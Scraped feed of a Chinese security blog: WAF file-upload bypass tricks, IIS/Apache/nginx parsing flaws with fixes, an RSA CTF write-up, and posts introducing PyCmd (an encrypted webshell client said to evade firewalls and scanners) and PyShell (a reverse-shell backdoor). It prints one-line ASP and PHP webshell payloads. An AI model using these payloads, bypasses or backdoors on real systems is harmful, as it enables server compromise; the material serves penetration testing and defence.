<h4 id="8-WAF绕过"><a href="#8-WAF绕过" class="headerlink" title="8.WAF绕过"></a>8.WAF绕过</h4><h5 id="8-1-垃圾数据"><a href="#8-1-垃圾数据" class="headerlink" title="8.1 垃圾数据"></a>8.1 垃圾数据</h5><p>　　有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；<br><img src="/upload_image/20160922/1.png" alt=""><br>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。<br><img src="/upload_image/20160922/2.png" alt=""><br>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p>
<h5 id="8-2-filename"><a href="#8-2-filename" class="headerlink" title="8.2 filename"></a>8.2 filename</h5><p>针对早期版本安全狗，可以多加一个filename<br><img src="/upload_image/20160922/3.png" alt=""><br>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：<br><img src="/upload_image/20160922/13.png" alt=""></p>
<h5 id="8-3-POST-GET"><a href="#8-3-POST-GET" class="headerlink" title="8.3 POST/GET"></a>8.3 POST/GET</h5><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
<h5 id="8-4-以上方式"><a href="#8-4-以上方式" class="headerlink" title="8.4 以上方式"></a>8.4 以上方式</h5><p>针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。</p>
<p><em>————————————————2017.2.6更新————————————————–</em></p>
<h5 id="8-5-利用waf本身缺陷"><a href="#8-5-利用waf本身缺陷" class="headerlink" title="8.5 利用waf本身缺陷"></a>8.5 利用waf本身缺陷</h5><h6 id="删除实体里面的Conten-Type字段"><a href="#删除实体里面的Conten-Type字段" class="headerlink" title="删除实体里面的Conten-Type字段"></a>删除实体里面的Conten-Type字段</h6><p><img src="/upload_image/20160922/4.png" alt=""><br>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">正常包：Content-Disposition: form-data; name=<span class="string">"image"</span>; filename=<span class="string">"085733uykwusqcs8vw8wky.png"</span>Content-Type: image/png</div><div class="line">构造包：Content-Disposition: form-data; name=<span class="string">"image"</span>; filename=<span class="string">"085733uykwusqcs8vw8wky.png</span></div><div class="line">C.php"</div></pre></td></tr></table></figure></p>
<h6 id="删除Content-Disposition字段里的空格"><a href="#删除Content-Disposition字段里的空格" class="headerlink" title="删除Content-Disposition字段里的空格"></a>删除Content-Disposition字段里的空格</h6><p><img src="/upload_image/20160922/5.png" alt=""><br>增加一个空格导致安全狗被绕过案列：<br>Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099<br>尝试在boundary后面加个空格或者其他可被正常处理的字符：<br>boundary= —————————47146314211411730218525550</p>
<h6 id="修改Content-Disposition字段值的大小写"><a href="#修改Content-Disposition字段值的大小写" class="headerlink" title="修改Content-Disposition字段值的大小写"></a>修改Content-Disposition字段值的大小写</h6><p><img src="/upload_image/20160922/6.png" alt=""></p>
<h6 id="Boundary边界不一致"><a href="#Boundary边界不一致" class="headerlink" title="Boundary边界不一致"></a>Boundary边界不一致</h6><p>每次文件上传时的Boundary边界都是一致的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099</div><div class="line">Content-Length: 253</div><div class="line">-----------------------------4714631421141173021852555099</div><div class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell.asp"</span></div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">"a"</span>)%&gt;</div><div class="line">-----------------------------4714631421141173021852555099--</div></pre></td></tr></table></figure></p>
<p>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：<br>Win2k3 + IIS6.0 + ASP<br><img src="/upload_image/20160922/7.png" alt=""></p>
<h6 id="文件名处回车"><a href="#文件名处回车" class="headerlink" title="文件名处回车"></a>文件名处回车</h6><p><img src="/upload_image/20160922/8.png" alt=""></p>
<h6 id="多个Content-Disposition"><a href="#多个Content-Disposition" class="headerlink" title="多个Content-Disposition"></a>多个Content-Disposition</h6><p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP<br><img src="/upload_image/20160922/9.png" alt=""></p>
<h5 id="利用NTFS-ADS特性"><a href="#利用NTFS-ADS特性" class="headerlink" title="利用NTFS ADS特性"></a>利用NTFS ADS特性</h5><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。<br><img src="/upload_image/20160922/10.png" alt=""></p>
<h4 id="其他情况补充"><a href="#其他情况补充" class="headerlink" title="其他情况补充"></a>其他情况补充</h4><h5 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h5><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。<br><img src="/upload_image/20160922/11.png" alt=""></p>
<h5 id="特殊的长文件名绕过"><a href="#特殊的长文件名绕过" class="headerlink" title="特殊的长文件名绕过"></a>特殊的长文件名绕过</h5><p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：<br>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</p>
<h5 id="反删除"><a href="#反删除" class="headerlink" title="反删除"></a>反删除</h5><p>将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）<br><img src="/upload_image/20160922/12.png" alt=""></p>
<p><hr></p>
<h3 id="文件校验的几点建议"><a href="#文件校验的几点建议" class="headerlink" title="文件校验的几点建议"></a>文件校验的几点建议</h3><ul>
<li>文件扩展名服务端白名单校验。</li>
<li>文件内容服务端校验。</li>
<li>上传文件重命名。</li>
<li>隐藏上传文件路径。</li>
</ul>
<p>　　以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。</p>
<p>参考文章：<br><a href="https://xianzhi.aliyun.com/forum/read/458.html?fpage=2" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/read/458.html?fpage=2</a><br><em>还有一篇tools上大牛的文章，url暂时找不到了……</em></p>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web应用漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[服务器解析漏洞]]></title>
      <url>http://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p>　　服务器解析漏洞算是历史比较悠久了，但如今依然广泛存在。在此记录汇总一些常见服务器的解析漏洞，比如IIS6.0、IIS7.5、apache、nginx等方便以后回顾温习。<br><a id="more"></a></p>
<h4 id="（一）IIS5-x-6-x解析漏洞"><a href="#（一）IIS5-x-6-x解析漏洞" class="headerlink" title="（一）IIS5.x-6.x解析漏洞"></a>（一）IIS5.x-6.x解析漏洞</h4><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
<h5 id="目录解析-6-0"><a href="#目录解析-6-0" class="headerlink" title="目录解析(6.0)"></a>目录解析(6.0)</h5><p>形式：www.xxx.com/xx.asp/xx.jpg<br>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p>
<h5 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h5><p>形式：www.xxx.com/xx.asp;.jpg<br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p>
<h5 id="解析文件类型"><a href="#解析文件类型" class="headerlink" title="解析文件类型"></a>解析文件类型</h5><p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>
<h5 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h5><p>1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。<br>2.做好权限设置，限制用户创建文件夹。</p>
<h4 id="（二）apache解析漏洞"><a href="#（二）apache解析漏洞" class="headerlink" title="（二）apache解析漏洞"></a>（二）apache解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p>
<h5 id="漏洞形式"><a href="#漏洞形式" class="headerlink" title="漏洞形式"></a>漏洞形式</h5><p>www.xxxx.xxx.com/test.php.php123</p>
<h5 id="其余配置问题导致漏洞"><a href="#其余配置问题导致漏洞" class="headerlink" title="其余配置问题导致漏洞"></a>其余配置问题导致漏洞</h5><p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>
<h5 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h5><p>1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;Files ~ “.(php.|php3.)”&gt;</div><div class="line">        Order Allow,Deny</div><div class="line">        Deny from all</div><div class="line">&lt;/Files&gt;</div></pre></td></tr></table></figure></p>
<p>2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;IfModule mod_rewrite.c&gt;</div><div class="line">RewriteEngine On</div><div class="line">RewriteRule .(php.|php3.) /index.php</div><div class="line">RewriteRule .(pHp.|pHp3.) /index.php</div><div class="line">RewriteRule .(phP.|phP3.) /index.php</div><div class="line">RewriteRule .(Php.|Php3.) /index.php</div><div class="line">RewriteRule .(PHp.|PHp3.) /index.php</div><div class="line">RewriteRule .(PhP.|PhP3.) /index.php</div><div class="line">RewriteRule .(pHP.|pHP3.) /index.php</div><div class="line">RewriteRule .(PHP.|PHP3.) /index.php</div><div class="line">&lt;/IfModule&gt;</div></pre></td></tr></table></figure></p>
<h4 id="（三）nginx解析漏洞"><a href="#（三）nginx解析漏洞" class="headerlink" title="（三）nginx解析漏洞"></a>（三）nginx解析漏洞</h4><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>　　Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：</p>
<p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<h5 id="漏洞形式-1"><a href="#漏洞形式-1" class="headerlink" title="漏洞形式"></a>漏洞形式</h5><p>www.xxxx.com/UploadFiles/image/1.jpg/1.php<br>www.xxxx.com/UploadFiles/image/1.jpg%00.php<br>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</p>
<p>另外一种手法：上传一个名字为test.jpg，以下内容的文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?PHP fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span>);?&gt;</div></pre></td></tr></table></figure></p>
<p>然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
<h5 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h5><p>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;<br>2.在Nginx配置文件中添加以下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">　　<span class="keyword">if</span> ( <span class="variable">$fastcgi_script_name</span> ~ ..*/.*php ) &#123;</div><div class="line">　　<span class="built_in">return</span> 403;</div><div class="line">　　&#125;</div></pre></td></tr></table></figure></p>
<p>　　这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。</p>
<h4 id="（四）IIS7-5解析漏洞"><a href="#（四）IIS7-5解析漏洞" class="headerlink" title="（四）IIS7.5解析漏洞"></a>（四）IIS7.5解析漏洞</h4><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web应用漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PyCmd 加密隐形木马]]></title>
      <url>http://thief.one/2016/09/18/PyCmd-%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC/</url>
      <content type="html"><![CDATA[<p>　　之前写了一个基于python的一句话木马客户端程序，这个程序的作用大致就是为了绕过防护设备，使敏感数据能在网络里自由穿梭。由于编程能力有限，当时以python程序作为客户端，php代码作为服务端，勉强能用，但是缺乏jsp的服务端，使之功能很局限。幸好有大神<a href="https://github.com/8caomei" target="_blank" rel="external">caomei</a>相助，帮助实现了jsp端的代码，故将两者相结合，方便使用。<br><a id="more"></a></p>
<h4 id="PyCmd使用"><a href="#PyCmd使用" class="headerlink" title="PyCmd使用"></a>PyCmd使用</h4><p>　　我这里准备了2个靶机，分别装有php与jsp的运行环境，用来模拟真实的网站服务器。<br>为了方便，我已经把服务端木马程序放到了服务器网站目录下：</p>
<ul>
<li>php网站木马地址：<a href="http://10.0.3.13/test/p.php" target="_blank" rel="external">http://10.0.3.13/test/p.php</a></li>
<li>jsp网站木马地址：<a href="http://192.168.10.149:8080/Test/1.jsp" target="_blank" rel="external">http://192.168.10.149:8080/Test/1.jsp</a></li>
</ul>
<p>此时，运行PyCmd.py程序：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python PyCmd.py -u http://10.0.3.13/<span class="built_in">test</span>/p.php -p <span class="built_in">test</span> [--proxy]</div></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python PyCmd.py -u http://192.168.10.149:8080/Test/1.jsp -p <span class="built_in">test</span> [--proxy]</div></pre></td></tr></table></figure></p>
<p>程序会自动判断输入的网站类型<br>输入参数：</p>
<ul>
<li>-h         查看帮助信息</li>
<li>-u         网站木马地址</li>
<li>-p         木马shell密码</li>
<li>–proxy    开启本地代理（方便调试）</li>
</ul>
<p>注：当开启本地调试，需运行Fiddler程序，或者其他抓包软件。</p>
<h4 id="PyCmd数据加密"><a href="#PyCmd数据加密" class="headerlink" title="PyCmd数据加密"></a>PyCmd数据加密</h4><p>PyCmd程序的长处在于它对往来的数据进行了加密，可以绕过防火墙对数据内容的校验。<br>当执行cmd命令时，通过Fiddler抓包查看数据：<br><img src="/upload_image/20160918/002.png" alt=""><br><img src="/upload_image/20160918/003.png" alt=""></p>
<h4 id="PyCmd木马隐身"><a href="#PyCmd木马隐身" class="headerlink" title="PyCmd木马隐身"></a>PyCmd木马隐身</h4><p>用D盾扫描上传的木马服务端文件，显示为正常文件，成功躲过查杀<br><img src="/upload_image/20160918/001.png" alt=""></p>
<h4 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h4><p>PyCmd  <a href="https://github.com/tengzhangchao/PyCmd" target="_blank" rel="external">下载地址</a></p>
]]></content>
      
        <categories>
            
            <category> 安全工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 木马后门 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[基于Python的WebServer]]></title>
      <url>http://thief.one/2016/09/14/%E5%9F%BA%E4%BA%8EPython%E7%9A%84WebServer/</url>
      <content type="html"><![CDATA[<p>　　WebServer的主要功能是用来运行代码，处理http请求等服务，比如常见的Apache，IIS，Nginx等都可以用来解析代码，处理请求。以上几种容器（中间件）功能强大，但是安装配置比较麻烦，对于像我这样的菜鸟来说，搭建一个web服务器可能要花几天时间。如果我们搭建web服务器并不是专门为了处理大规模的请求，而只是为了测试使用，那么一个方便速成的WebServer就至关重要了。<br><a id="more"></a></p>
<h4 id="Python-WebServer编程介绍"><a href="#Python-WebServer编程介绍" class="headerlink" title="Python WebServer编程介绍"></a>Python WebServer编程介绍</h4><ul>
<li>BaseHTTPServer: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。</li>
<li>SimpleHTTPServer: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。</li>
<li>CGIHTTPServer: 包含处理POST请求和执行CGIHTTPRequestHandler类</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m SimpleHTTPServer 8000</div></pre></td></tr></table></figure>
<p>python内置很多好用的库，此时打开浏览器，访问localhost:8000端口即可。</p>
<h4 id="PyWebServer介绍"><a href="#PyWebServer介绍" class="headerlink" title="PyWebServer介绍"></a>PyWebServer介绍</h4><p>　　由于用python搭建一个简易的WebServer十分方便，因此我便写一个简单的启动器，类似于SimpleHTTPServer。为了方便没有安装python环境的windows机子启动，用pyinstaller工具将py程序打包成了exe可执行程序。</p>
<h5 id="Linux下运行代码"><a href="#Linux下运行代码" class="headerlink" title="Linux下运行代码"></a>Linux下运行代码</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python PyWebServer.py -h</div><div class="line">python PyWebServer.py -i 10.0.0.1 -p 8888   <span class="comment">##指定ip与端口,默认为8888</span></div></pre></td></tr></table></figure>
<h5 id="windows下运行代码"><a href="#windows下运行代码" class="headerlink" title="windows下运行代码"></a>windows下运行代码</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PyWebServer.exe -h  </div><div class="line">PyWebServer.exe -p 8888      <span class="comment">##指定端口,默认为8888</span></div></pre></td></tr></table></figure>
<p>运行完以后,可以在其他机子上访问，进行文件下载等操作！</p>
<h4 id="PyWebServer功能"><a href="#PyWebServer功能" class="headerlink" title="PyWebServer功能"></a>PyWebServer功能</h4><p>功能可以自由想象发挥，比如说：</p>
<ul>
<li>可以在服务器上运行程序，解析一段精心构造的py代码，远程执行系统命令。（如不在同一网段，需要转发端口）</li>
<li>可以在服务器上运行程序，用来替代FTP等工具，下载服务器上的文件（当服务器是linux时，使用比较方便）<br>……</li>
</ul>
<h4 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h4><p>PyWebServer     <a href="https://github.com/tengzhangchao/PyWebServer" target="_blank" rel="external">下载地址</a></p>
]]></content>
      
        <categories>
            
            <category> 安全工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python运维脚本 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RSA加密算法解析]]></title>
      <url>http://thief.one/2016/09/06/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%A7%A3%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>　　几个月前参加了一次CTF比赛，其中遇到了RSA加密解密题，当时也是一头雾水，赛后便查找资料整理了一番，在此总结分享。<br><a id="more"></a></p>
<h4 id="算法介绍"><a href="#算法介绍" class="headerlink" title="算法介绍"></a>算法介绍</h4><p>　　RSA加密算法属于公钥加密算法，是一种非对称密码算法，所谓非对称，就是一个密码用来加密，另一个密码用来解密，一般来说，用公钥加密，私钥解密，当然也有其他情况。</p>
<h4 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h4><p>　　RSA算法基于一个事实：将两个大素数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。RSA算法三个参数：n、e1、e2</p>
<p>n=p<em>q   （p、q为2个大质数） n的二进制所占用的位数即秘钥的长度。<br>e1与e2是一对相关的值，e1可以任意取，但要求e1与(p-1)</em>(q-1)互质；要求(e2<em>e1)mod((p-1)</em>(q-1))=1。<br>(n,e1),(n,e2)就是密钥对，其中(n,e1)为公钥，(n,e2)为私钥。</p>
<h4 id="算法公式"><a href="#算法公式" class="headerlink" title="算法公式"></a>算法公式</h4><p>假设：<br>A:明文<br>B:密文</p>
<p>——用公钥加密公式——<br>A=B^e2 mod n<br>B=A^e1 mod n      </p>
<p>——用私钥加密公式——<br>A=B^e1 mod n<br>B=A^e2 mod n</p>
<h4 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h4><h5 id="题目概要"><a href="#题目概要" class="headerlink" title="题目概要"></a>题目概要</h5><p>这是一个公钥加密，公钥解密的RSA题目<br>给出公钥密码为：{920139713,19}，其中920139713为n，19为e1。<br>待解密的密文B为：<br>704796792<br>752211152<br>274704164<br>18414022<br>368270835<br>483295235<br>263072905<br>459788476<br>483295235<br>459788476<br>……<br>最终求解私钥A的值？</p>
<h5 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h5><p>列出公式：公钥加密<br>假设：<br>A:明文<br>B:密文<br>A=B^e2 mod n<br>B=A^e1 mod n</p>
<p>此题给出了B,n,e1,求A的值，带入公式2即可求解。</p>
<h5 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import string</div><div class="line">strs=string.digits+string.lowercase    <span class="comment">#列举a-z数字</span></div><div class="line"></div><div class="line">f=open(<span class="string">"data.txt"</span>)   <span class="comment">#把密文B的内容写进data.txt，方便程序读取</span></div><div class="line">data=f.readlines()</div><div class="line">f.close()</div><div class="line"></div><div class="line">plaintext=<span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> b <span class="keyword">in</span> data:    <span class="comment">#取出所有密文(b)</span></div><div class="line">	<span class="keyword">for</span> a <span class="keyword">in</span> strs:   <span class="comment">#取出所有可能的明文(a)</span></div><div class="line">		<span class="keyword">if</span> ord(a)**19 % 920139713==int(b.strip()):         <span class="comment">#ord   将字符串转换为ascii码</span></div><div class="line">			plaintext+=a</div><div class="line"></div><div class="line"><span class="built_in">print</span> plaintext</div></pre></td></tr></table></figure>
<h5 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h5><p>flag13212je2ue28fy71w8u87y31r78eu1e2</p>
]]></content>
      
        <categories>
            
            <category> 技术研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 加密算法 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PyShell 木马后门]]></title>
      <url>http://thief.one/2016/09/05/PyShell-%E6%9C%A8%E9%A9%AC%E5%90%8E%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>　　在渗透测试过程中，经常会遇到一种状况：获取到了目标服务器的shell，需要进一步开展内网渗透，然而由于各种原因无法远程登录服务器，此时内网渗透往往很难开展。由此难点，我研发了一款具有针对性的后门程序，功能有点类似于NC(瑞士军刀)，但不局限于NC的功能，在此分享以表对NC的敬意。<br><a id="more"></a></p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[HELP]  PyShell.exe [-listen(-slave)] [ip] [port]        <span class="comment">#绿色免环境版</span></div><div class="line">[HELP]  python PyShell.py [-listen(-slave)] [ip] [port]</div></pre></td></tr></table></figure>
<h3 id="功能参数"><a href="#功能参数" class="headerlink" title="功能参数"></a>功能参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[HELP]  <span class="built_in">exit</span>    ----退出连接</div><div class="line">[HELP]  <span class="built_in">kill</span>    ----退出连接并自毁程序</div><div class="line">[HELP]  playtask    ----创建计划任务</div><div class="line">[HELP]  python -p file.py    ----在肉鸡上执行本地python脚本</div></pre></td></tr></table></figure>
<h3 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h3><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><p>本机的IP地址为：10.0.3.119<br>本机上装了一个虚拟机，IP地址为：192.168.67.130 </p>
<p>本机充当为目标服务器(被攻端),虚拟机充当为攻击机(攻击端)</p>
<h4 id="运行木马"><a href="#运行木马" class="headerlink" title="运行木马"></a>运行木马</h4><p>首先在虚拟机上运行PyShell程序，监听一个未被使用的端口，如：2222</p>
<p>接着在本机上运行PyShell程序，连接虚拟机的这个端口<br><img src="/upload_image/20160905_2/001.png" alt=""></p>
<p>可以看到，虚拟机上反弹了一个shell<br><img src="/upload_image/20160905_2/002.png" alt=""></p>
<p>在虚拟机shell中查询ip地址，是本机的10网段<br><img src="/upload_image/20160905_2/003.png" alt=""></p>
<p>在虚拟机shell中执行命令，使本机执行python脚本，进行内网端口扫描<br><img src="/upload_image/20160905_2/004.png" alt=""></p>
<blockquote>
<p>提示：python脚本并未传到本机，而是通过数据包形式传递到了PyShell文件内执行，数据流量经过16进制+Base64加密，可以绕过防火墙</p>
</blockquote>
<p>创建计划任务<br><img src="/upload_image/20160905_2/005.png" alt=""></p>
<p>本机查看结果<br><img src="/upload_image/20160905_2/006.png" alt=""></p>
<h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><ul>
<li><p>程序对互相传输的数据进行了加密，以绕过防火墙。</p>
</li>
<li><p>当需要在肉鸡上执行python脚本时，不需要在肉鸡上上传相应的脚本文件，只需将本地脚本内容加密传输到肉鸡，并执行即可。</p>
</li>
<li><p>此程序在执行完命令以后，并不能时时回显结果，也就是说python脚本运行完以后才会返回输出，有待完善。</p>
</li>
</ul>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>PyShell 木马后门  <a href="https://github.com/tengzhangchao/PyShell/" target="_blank" rel="external">下载地址</a></p>
]]></content>
      
        <categories>
            
            <category> 安全工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 木马后门 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[windows服务器信息收集工具]]></title>
      <url>http://thief.one/2016/09/04/windows%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
      <content type="html"><![CDATA[<p>　　在日常的安全服务工作中，经常会遇到需要收集目标服务器系统信息的需求，例如：系统日志，中间件日志，系统信息等。收集这些信息，有助于分析服务器安全状况，也有利于被入侵后的取证分析。然而客户网络环境往往很复杂，服务器较多，系统版本也不尽相同，给手工收集带来了很多麻烦，因此便研究开发了<em>服务器信息收集工具</em>。<br><a id="more"></a></p>
<h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><ul>
<li>收集系统日志</li>
<li>收集系统信息<ol>
<li>开机时间</li>
<li>IP_MAC地址</li>
<li>用户信息</li>
<li>操作系统版本</li>
<li>进程信息</li>
<li>hosts文件</li>
<li>端口信息</li>
</ol>
</li>
<li>收集中间件日志<ol>
<li>Apache</li>
<li>IIS</li>
<li>Tomcat</li>
<li>JBOSS</li>
</ol>
</li>
